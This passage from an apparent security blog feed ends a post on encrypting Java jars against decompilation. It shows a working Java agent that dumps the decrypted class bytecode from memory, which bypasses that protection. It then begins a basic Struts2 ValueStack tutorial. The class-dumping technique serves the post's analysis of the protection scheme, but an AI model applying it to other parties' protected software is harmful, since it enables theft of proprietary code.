jni_md.h</code>命令来找到这两个文件所在的路径，然后在Makefile中第一个INCLUDEDIR项中添加进去即可：</p><p><img src="/2020/05/01/Java代码反反编译思路/11.png" alt=""></p><p>libdecrypt.so的编译同上：</p><p><img src="/2020/05/01/Java代码反反编译思路/12.png" alt=""></p><p>接着，通过<code>javac Encrypt.java</code>命令将该java文件转换为class文件：</p><p><img src="/2020/05/01/Java代码反反编译思路/13.png" alt=""></p><p>通过如下命令加密jar包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.library.path=. -cp . Encrypt -src ClassEncode.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/05/01/Java代码反反编译思路/14.png" alt=""></p><p>此时用反编译工具是没办法成功反编译的：</p><p><img src="/2020/05/01/Java代码反反编译思路/15.png" alt=""></p><p>此时运行肯定是会失败的：</p><p><img src="/2020/05/01/Java代码反反编译思路/16.png" alt=""></p><p>使用刚刚的编译生成的解密库来执行就ok了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$&#123;LD_LIBRARY_PATH&#125;</span>:/root/jvmti/decrypt</span><br><span class="line">java -agentlib:decrypt -jar ClassEncode_encrypt.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/05/01/Java代码反反编译思路/17.png" alt=""></p><p>至此，已经通过加密Jar包和class文件实现了反反编译。在发布时候，需要把ClassEncode_encrypt.jar和libdecrypt.so发布出去，执行时候引入libdecrypt即可。</p><h3 id="通过Java-Agent绕过反反编译"><a href="#通过Java-Agent绕过反反编译" class="headerlink" title="通过Java-Agent绕过反反编译"></a>通过Java-Agent绕过反反编译</h3><p>这部分在JavaAgent中会具体说明。</p><p>MainAgent.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dumpclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DumpClassTransformer());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DumpClassTransformer.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dumpclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DumpClassTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DUMP_PACKAGE = System.getProperty(<span class="string">"dump_package"</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String OUT_FOLDER = System.getProperty(<span class="string">"dump_out_folder"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classfileBuffer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String tmpClassName = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line">        <span class="keyword">if</span> (tmpClassName.startsWith(DUMP_PACKAGE)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                writeClass(className, classfileBuffer);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">writeClass</span><span class="params">(String className, <span class="keyword">byte</span>[] classfileBuffer)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">null</span>;</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String folder = OUT_FOLDER;</span><br><span class="line">            <span class="keyword">if</span> (!folder.endsWith(File.separator)) &#123;</span><br><span class="line">                folder = folder + File.separator;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String classPath = className.substring(<span class="number">0</span>, className.lastIndexOf(<span class="string">"/"</span>));</span><br><span class="line">            className = className.substring(className.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>, className.length());</span><br><span class="line"></span><br><span class="line">            String path = OUT_FOLDER + File.separator + classPath;</span><br><span class="line">            file = <span class="keyword">new</span> File(path);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">            file = <span class="keyword">new</span> File(path + File.separator + className + <span class="string">".class"</span>);</span><br><span class="line"></span><br><span class="line">            fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            fileOutputStream.write(classfileBuffer);</span><br><span class="line"></span><br><span class="line">            fileOutputStream.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (fileOutputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    fileOutputStream.close();</span><br><span class="line">                    fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MANIFEST.MF：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: com.dumpclass.MainAgent</span><br></pre></td></tr></table></figure><p>打包成ClassEncode_encrypt.jar。</p><p>通过以下命令，指定JavaAgent的jar包，然后在目标jar包主执行类方法执行之前先执行DumpClass.jar中的premain()方法，从而从内存将加密的目标jar类的字节码Dump下来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Ddump_package=com.mi1k7ea -Ddump_out_folder=/tmp -agentlib:decrypt -javaagent:DumpClass.jar -jar ClassEncode_encrypt.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/05/01/Java代码反反编译思路/18.png" alt=""></p><p>下载下来，此时就能从成功反编译</p><p>获取到加密class文件的内容了：</p><p><img src="/2020/05/01/Java代码反反编译思路/19.png" alt=""></p><h2 id="0x04-Java代码混淆"><a href="#0x04-Java代码混淆" class="headerlink" title="0x04 Java代码混淆"></a>0x04 Java代码混淆</h2><p>参考：<a href="https://www.cnblogs.com/nevermorewang/p/8041548.html" target="_blank" rel="noopener">https://www.cnblogs.com/nevermorewang/p/8041548.html</a></p><p>这种反反编译方法的没啥破解方法，就是代码比较难读而已，花点时间精力就可以搞定。</p><h2 id="0x05-使用花指令"><a href="#0x05-使用花指令" class="headerlink" title="0x05 使用花指令"></a>0x05 使用花指令</h2><p>这部分还未研究，有待补充。。。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="http://www.alonemonkey.com/2016/05/25/encrypt-jar-class/" target="_blank" rel="noopener">jar包加密保护解决方案</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-几种反反编译的方法&quot;&gt;&lt;a href=&quot;#0x01-几种反反编译的方法&quot; class=&quot;headerlink&quot; title=&quot;0x01 几种反反编译的方法&quot;&gt;&lt;/a&gt;0x01 几种反反编译的方法&lt;/h2&gt;&lt;p&gt;Java代码是可以反编译的，但是很多时候一些
      
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之ValueStack（值栈）</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8BValueStack%EF%BC%88%E5%80%BC%E6%A0%88%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之ValueStack（值栈）/</id>
    <published>2020-04-30T16:00:05.000Z</published>
    <updated>2020-08-15T06:40:56.383Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>值栈（ValueStack）就是 OGNL 表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。值栈是一组对象，按照提供的顺序存储以下这些对象：</p><table><thead><tr><th style="text-align:left">序号</th><th style="text-align:left">对象和说明</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left"><strong>Temporary对象</strong>实际中存在各种在页面执行期间创建的temporary对象。例如，JSP标签循环集合的当前迭代值。</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left"><strong>Model对象</strong>如果在struts应用程序中使用Model对象，则当前Model对象放在值堆栈上的action之前。</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left"><strong>Action对象</strong>这是指正在执行的当前action对象。</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left"><strong>命名对象</strong>这些对象包括#application，#session，#request，#attr和#parameters以及所引用的相应的servlet作用域。</td></tr></tbody></table><p>在使用 Struts2 的项目中，Struts2 会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。</p><h2 id="0x02-作用"><a href="#0x02-作用" class="headerlink" title="0x02 作用"></a>0x02 作用</h2><p>值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将 Struts2 的标签与 OGNL 表达式结合使用。值栈实际上是一个接口，在 Struts2 中利用 OGNL 时，实际上使用的就是实现了该接口的 OgnlValueStack 类，这个类是 OGNL 的基础。</p><h2 id="0x03-生命周期"><a href="#0x03-生命周期" class="headerlink" title="0x03 生命周期"></a>0x03 生命周期</h2><p>值栈贯穿整个 Action 的生命周期，每个 Action 类的对象实例都拥有一个 ValueStack 对象，在 ValueStack 对象中保存了当前 Action 对象和其他相关对象。</p><p>Struts2 框架把 ValueStack 对象保存在一个名为 struts.valueStack 的 request 属性中，也就是说，值栈与 Action 的生命周期一致。值栈的生命周期随着 request 的创建而创建，随着 request 的销毁而销毁。</p><h2 id="0x04-值栈的获取方式"><a href="#0x04-值栈的获取方式" class="headerlink" title="0x04 值栈的获取方式"></a>0x04 值栈的获取方式</h2><p>要获取值栈中存储的数据，首先应该获取值栈。</p><p>值栈的获取有两种方式。</p><h3 id="在request中获取值栈"><a href="#在request中获取值栈" class="headerlink" title="在request中获取值栈"></a>在request中获取值栈</h3><p>ValueStack 对象在 request 范围内的存储方式为 <code>request.setAttribute(&quot;struts.valueStack&quot;,valuestack)</code>，可以通过如下方式从 request 中取出值栈的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取 ValueStack 对象，通过 request 对象获取</span></span><br><span class="line">ValueStack valueStack = (ValueStack)ServletActionContext.getRequest()</span><br><span class="line">            .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY);</span><br></pre></td></tr></table></figure><p>ServletActionContext.STRUTS_VALUESTACK_KEY 是 ServletActionContext 类中的常量，它的值为 struts.valueStack。</p><h3 id="在ActionContext中获取值栈"><a href="#在ActionContext中获取值栈" class="headerlink" title="在ActionContext中获取值栈"></a>在ActionContext中获取值栈</h3><p>在使用 Struts2 框架时，可以使用 OGNL 操作 Context 对象从 ValueStack 中存取数据，也就是说，可以从 Context 对象中获取 ValueStack 对象。实际上，Struts2 框架中的 Context 对象就是 ActionContext。</p><p>ActionContext 获取 ValueStack 对象的方式如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过 ActionContext 获取 valueStack 对象</span></span><br><span class="line">ValueStack valueStack = ActionContext.getContext().getValueStack();</span><br></pre></td></tr></table></figure><p>ActionContext 对象是在 StrutsPrepareAndExcuteFilter 的 doFilter() 方法中被创建的，在源码中用于创建 ActionContext 对象的 createActionContext() 方法内可以找到获取的 ValueStack 对象的信息。</p><p>方法中还有这样一段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx=<span class="keyword">new</span> ActionContext(stack.getContext());</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，ValueStack 对象中的 Context 对象被作为参数传递给了 ActionContext 对象，这也就说明 ActionContext 对象中持有了 ValueStack 对象的引用，因此可以通过 ActionContext 对象获取 ValueStack 对象。</p><p>其实ValueStack就在ActionContext的request-&gt;struts.ValueStack中：</p><p><img src="/2020/05/01/Struts2基础篇之ValueStack（值栈）/1.png" alt=""></p><h2 id="0x05-值栈的方法"><a href="#0x05-值栈的方法" class="headerlink" title="0x05 值栈的方法"></a>0x05 值栈的方法</h2><p>一旦你有一个值栈对象，你可以使用以下方法来操纵该对象：</p><table><thead><tr><th style="text-align:left">序号</th><th style="text-align:left">值栈方法和说明</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left"><strong>Object findValue(String expr)</strong>通过在默认搜索顺序中对值栈评估所给定的表达式来查找值。</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left"><strong>CompoundRoot getRoot()</strong>获取将对象推入值栈的CompoundRoot。</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left"><strong>Object peek()</strong>获取值栈顶部的对象而不改变值栈。</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left"><strong>Object pop()</strong>获取值栈顶部的对象，并将其从值栈中删除。</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left"><strong>void push(Object o)</strong>将对象放在值栈的顶部。</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left"><strong>void set(String key,Object o)</strong>使用给定的key在值栈上设置一个对象，使其可通过findValue（key,…）检索。</td></tr><tr><td style="text-align:left">7</td><td style="text-align:left"><strong>void setDefaultType(Class defaultType)</strong>设置在获取值时要转换的默认类型。</td></tr><tr><td style="text-align:left">8</td><td style="text-align:left"><strong>void setValue(String expr,Object value)</strong>尝试使用由默认搜索顺序给定的表达式在值栈的bean上设置属性。</td></tr><tr><td style="text-align:left">9</td><td style="text-align:left"><strong>int size()</strong> 获取值栈中的对象数。</td></tr></tbody></table><h2 id="0x06-ValueStack、StackContext、ActionContext"><a href="#0x06-ValueStack、StackContext、ActionContext" class="headerlink" title="0x06 ValueStack、StackContext、ActionContext"></a>0x06 ValueStack、StackContext、ActionContext</h2><p><strong>具体作用的描述:</strong></p><ul><li>valueStack: 里面存放的是Action类中通过set方法设置的属性值(表单传过来的值等),由OGNL框架实现</li><li>stackContext: 也是用来存值的,stack上下文，它包含一些列对象，包括request/session/attr/application map等</li><li>actionContext: 是action的上下文,可以得到request,session,application等,我们在JSP页面中访问value stack的内容时，是不用加#，而如果是访问stack context的其他对象则要加上#</li></ul><p><strong>具体区别:</strong></p><ul><li>ActionContext 就是应用上下文，可以通过他来访问session对象等，可以保存的数据，以map形式存储,在这个应用中都可以访问该数据。通常用于还回一个session对象。</li><li>ValueStack 是OGNL表达式语言中的值栈， 用来封装继承了action接口的类的属性值，以栈结构存储,在同一个请求范围类有效，在页面中直接通过表达式${属性名}就可以取出</li><li>值栈也称为栈结构，ActionContext也称为映射结构,表示值栈的context</li><li>ValueStack和ActionContext本质上可以互相获得。ValueStack.getContext()方法得到的Map其实就是ActionContext的Map</li></ul><h3 id="ValueStack的内容"><a href="#ValueStack的内容" class="headerlink" title="ValueStack的内容"></a>ValueStack的内容</h3><p>经过调试发现：</p><p><img src="/2020/05/01/Struts2基础篇之ValueStack（值栈）/2.png" alt=""></p><p>值得注意的以下几点：</p><ul><li>context实际上就是ActionContext的context内容；</li><li>securityMemberAccess是后续的Struts2一直发展的安全措施；</li></ul><h3 id="ActionContext的内容"><a href="#ActionContext的内容" class="headerlink" title="ActionContext的内容"></a>ActionContext的内容</h3><p>ActionContext主要维护一个context对象，我们下面称为ContextMap。</p><p>一般情况下，root 对象在存储 Action 的相关信息时会把相关的映射压入ContextMap中，这些相关的映射具体如下：</p><table><thead><tr><th style="text-align:left">key</th><th style="text-align:left">key的声明处</th><th style="text-align:left">value的类型</th><th style="text-align:left">value.toString()</th></tr></thead><tbody><tr><td style="text-align:left">com.opensymphony.xwork2.dispatcher.HttpServletRequest</td><td style="text-align:left">StrutsStatics.HTTP_REQUEST</td><td style="text-align:left">org.apache.struts2.dispatcher.StrutsRequestWrapper</td><td style="text-align:left">org.apache.struts2.dispatcher.StrutsRequestWrapper@10984e0</td></tr><tr><td style="text-align:left">application</td><td style="text-align:left">无</td><td style="text-align:left">org.apache.struts2.dispatcher.ApplicationMap</td><td style="text-align:left">略</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.locale</td><td style="text-align:left">ActionContext.LOCALE</td><td style="text-align:left">java.util.Locale</td><td style="text-align:left">zh_CN</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.dispatcher.HttpServletResponse</td><td style="text-align:left">StrutsStatics.HTTP_RESPONSE</td><td style="text-align:left">org.apache.catalina.connector.ResponseFacade</td><td style="text-align:left">org.apache.catalina.connector.ResponseFacade@14ecfe8</td></tr><tr><td style="text-align:left">xwork.NullHandler.createNullObjects</td><td style="text-align:left"></td><td style="text-align:left">Boolean</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.name</td><td style="text-align:left">ActionContext.ACTION_NAME</td><td style="text-align:left">String</td><td style="text-align:left">index</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.conversionErrors</td><td style="text-align:left">ActionContext.CONVERSION_ERRORS</td><td style="text-align:left">java.util.HashMap</td><td style="text-align:left">{}</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.application</td><td style="text-align:left">ActionContext.APPLICATION</td><td style="text-align:left">org.apache.struts2.dispatcher.ApplicationMap</td><td style="text-align:left">略</td></tr><tr><td style="text-align:left">attr</td><td style="text-align:left">无</td><td style="text-align:left">org.apache.struts2.util.AttributeMap</td><td style="text-align:left">org.apache.struts2.util.AttributeMap@133a2a8</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.container</td><td style="text-align:left">ActionContext.CONTAINER</td><td style="text-align:left">com.opensymphony.xwork2.inject.ContainerImpl</td><td style="text-align:left">com.opensymphony.xwork2.inject.ContainerImpl@fc02c8</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.dispatcher.ServletContext</td><td style="text-align:left">StrutsStatics.SERVLET_CONTEXT</td><td style="text-align:left">org.apache.catalina.core.ApplicationContextFacade</td><td style="text-align:left">org.apache.catalina.core.ApplicationContextFacade@11ad78c</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.session</td><td style="text-align:left">ActionContext.SESSION</td><td style="text-align:left">org.apache.struts2.dispatcher.SessionMap</td><td style="text-align:left">{}</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext. actionInvocation</td><td style="text-align:left">ActionContext.ACTION_INVOCATION</td><td style="text-align:left">com.opensymphony.xwork2.DefaultActionInvocation</td><td style="text-align:left">com.opensymphony.xwork2.DefaultActionInvocation@13d4497</td></tr><tr><td style="text-align:left">xwork.MethodAccessor.denyMethodExecution</td><td style="text-align:left">笔者很懒，没有找</td><td style="text-align:left">Boolean</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left">report.conversion.errors</td><td style="text-align:left">笔者很懒，没有找</td><td style="text-align:left">Boolean</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left">session</td><td style="text-align:left">无</td><td style="text-align:left">org.apache.struts2.dispatcher.SessionMap</td><td style="text-align:left">{}</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.ValueStack.ValueStack</td><td style="text-align:left">ValueStack.VALUE_STACK</td><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlValueStack</td><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlValueStack@16237fd</td></tr><tr><td style="text-align:left">request</td><td style="text-align:left">无</td><td style="text-align:left">org.apache.struts2.dispatcher.RequestMap</td><td style="text-align:left">略</td></tr><tr><td style="text-align:left">action</td><td style="text-align:left">笔者很懒，没有找</td><td style="text-align:left">com.example.MyAction</td><td style="text-align:left">略</td></tr><tr><td style="text-align:left">struts.actionMapping</td><td style="text-align:left">笔者很懒，没有找</td><td style="text-align:left">org.apache.struts2.dispatcher.mapper.ActionMapping</td><td style="text-align:left">org.apache.struts2.dispatcher.mapper.ActionMapping@892cc5</td></tr><tr><td style="text-align:left">parameters</td><td style="text-align:left">无</td><td style="text-align:left">java.util.HashMap</td><td style="text-align:left">{}</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ActionContext.parameters</td><td style="text-align:left">ActionContext.PARAMETERS</td><td style="text-align:left">java.util.TreeMap</td></tr></tbody></table><h2 id="0x06-值栈内部结构详解"><a href="#0x06-值栈内部结构详解" class="headerlink" title="0x06 值栈内部结构详解"></a>0x06 值栈内部结构详解</h2><p>ValueStack 对象的内部有两个逻辑部分。</p><ul><li>ObjectStack（对象栈）：是 CompoundRoot 类型，用 ArrayList 定义，Struts2 把动作和相关对象压入 ObjectStack 中。</li><li>ContextMap（Map 栈）：是 OgnlContext 类型，是一个 Map 集合，Struts2 把各种各样的映射关系（一些 Map 类型的对象）压入 ContextMap 中。</li></ul><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>新建一个名称为 ValueStackAction 的类，并在类中编写一个获取 ValueStack 对象的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.ognl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.util.ValueStack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValueStackAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 通过ActionContext获取valueStack对象</span></span><br><span class="line">        ValueStack valueStack = ActionContext.getContext().getValueStack();</span><br><span class="line">        System.out.println(valueStack);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将新建的 Action 信息添加到 struts.xml 中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"valueStack"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.ognl.ValueStackAction"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后，开启远程调试，在 ValueStackAction 类中的第 11 行处设置断点，访问<code>http://localhost:8080/st2test/valueStack.action</code>，从 Variables 窗口中可以看到 valueStack 的结构信息：</p><p><img src="/2020/05/01/Struts2基础篇之ValueStack（值栈）/3.png" alt=""></p><p>这里只需关注 context 对象和 root 对象。从图中可以看到，context 对象的类型为 OgnlContext，root 对象的类型为 CompoundRoot。如果要查看这两个类的源码，则可以看到如下语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OgnlContext extends Object implements Map</span><br><span class="line">CompoundRoot extends ArrayList</span><br></pre></td></tr></table></figure><p>从上述两个类的源码中可以看出，context 对象实际上就是一个 Map，root 对象实际上就是一个 ArrayList。也就说明了 ValueStack 的两个逻辑部分 ObjectStack 对应 ArrayList（root），ContextMap 对应 Map（context）。</p><p>一般情况下，root 对象在存储 Action 的相关信息时会把相关的映射压入 ContextMap 中，这些相关的映射具体如下。</p><ul><li>parameters：该 Map 中包含当前请求的请求参数。</li><li>request：该 Map 中包含当前 request 对象中的所有属性。</li><li>session：该 Map 中包含当前 session 